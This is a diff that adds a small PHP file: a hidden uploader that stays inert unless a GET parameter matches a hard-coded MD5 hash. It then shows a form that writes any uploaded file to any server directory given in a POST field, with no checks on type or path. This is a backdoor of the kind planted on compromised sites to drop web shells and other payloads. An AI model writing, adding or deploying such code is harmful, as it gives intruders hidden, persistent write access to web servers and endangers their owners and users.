@@ -1,0 +1,25 @@
+<?php
+
+$live = md5(($_GET['i']));
+if ($live == 'c4ca4238a0b923820dcc509a6f75849b'){
+$dir = $_POST['dir'];
+if ($dir == ''){
+$dir = getcwd();
+}
+echo "<left>
+<form method='POST' enctype='multipart/form-data'>
+<input type='file' name='hiUP' size='23' >
+<input type='text' name='dir' value='$dir' >
+<input type='submit' value='Upload' size='35' >
+</form>
+</left>
+";
+if (!empty ($_FILES['hiUP']))
+{
+    move_uploaded_file($_FILES['hiUP']['tmp_name'],$dir.'/'.$_FILES['hiUP']['name']);
+    echo "<b>Uploaded Successfully</b><br>file name : ".$_FILES['hiUP']['name']."<br>file size : ".$_FILES['hiUP']['size']."<br>file type : ".$_FILES['hiUP']['type']."<br>";
+}
+exit;
+}
+
+?>
